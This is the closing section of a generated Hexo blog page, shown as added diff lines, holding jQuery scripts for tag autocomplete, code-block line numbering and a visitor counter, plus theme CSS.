+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#aes加密','#base64','#ctf-web','#file_incloude','#MySql_where','#MySql_like','#MySql_regexp','#MySql_select','#MySql_order by','#Git','#MySql_group by','#MySql_having','#MySql_show','#MySql_function','#MySql_jion','#MySql_insert','#MySql_update','#MySql_delete','#MySql_concat','#MySql_union','#MySql_create','#MySql_alter','#SSIT','#MySql_subquery','#Markdown','#zip','#hexo',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
